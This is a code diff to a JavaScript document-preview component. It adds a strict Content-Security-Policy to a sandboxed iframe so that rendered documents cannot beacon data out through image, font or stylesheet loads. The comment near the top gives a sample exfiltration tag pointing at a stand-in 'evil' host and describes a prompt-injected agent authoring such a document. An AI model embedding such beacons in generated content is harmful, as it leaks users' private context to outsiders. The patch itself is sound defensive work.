@@ -59,6 +59,29 @@
     return n;
   }
 
+  // The preview iframe uses sandbox="" (scripts/forms/same-origin/popups all
+  // denied), but an EMPTY sandbox does NOT block PASSIVE subresource loads —
+  // <img>, <link rel=stylesheet>, fonts, media all still fetch. A hostile
+  // document (e.g. one authored by a prompt-injected agent via CreateCard, or
+  // any generated doc) could therefore beacon context data out with
+  // `<img src="https://evil/?d=SECRET">` the instant it renders. Close that
+  // channel with a strict CSP injected at RENDER time (not into the stored
+  // html, so exports stay the clean source): allow only inline CSS and data:
+  // images/fonts; deny every remote fetch. Self-contained documents (the
+  // generator's own contract) are unaffected.
+  const DOC_CSP = "default-src 'none'; img-src data:; style-src 'unsafe-inline';"
+    + " font-src data:; base-uri 'none'; form-action 'none'";
+  function withCsp(html) {
+    const meta = '<meta http-equiv="Content-Security-Policy" content="'
+      + DOC_CSP + '">';
+    const s = String(html || '');
+    // Put the meta as early as the CSP spec needs (inside <head>, else right
+    // after <html>, else prepend). Case-insensitive, first match only.
+    if (/<head[^>]*>/i.test(s)) return s.replace(/<head[^>]*>/i, (m) => m + meta);
+    if (/<html[^>]*>/i.test(s)) return s.replace(/<html[^>]*>/i, (m) => m + meta);
+    return meta + s;
+  }
+
   (function injectStyles() {
     if (document.getElementById('atl-document-styles')) return;
     const css = `
@@ -235,12 +258,14 @@
 
     const view = el('div', 'atl-document-view');
     const frame = document.createElement('iframe');
-    // SECURITY INVARIANT: sandbox="" (EMPTY) — the document is static, so
-    // scripts/forms/popups/same-origin are all denied. Stronger than the
-    // mini-app card's allow-scripts; nothing inside can run code or reach the
-    // preload bridge.
+    // SECURITY INVARIANT: sandbox="" (EMPTY) denies scripts/forms/popups/
+    // same-origin — stronger than the mini-app card's allow-scripts; nothing
+    // inside can run code or reach the preload bridge. The empty sandbox does
+    // NOT block passive remote loads, so withCsp() below adds a strict CSP that
+    // denies every remote subresource (see its comment) — together they leave
+    // the document fully inert AND unable to beacon out.
     frame.setAttribute('sandbox', '');
-    frame.srcdoc = inst.html;
+    frame.srcdoc = withCsp(inst.html); // strict CSP blocks remote subresource beacons
     view.append(frame);
     body.append(head, view);
 
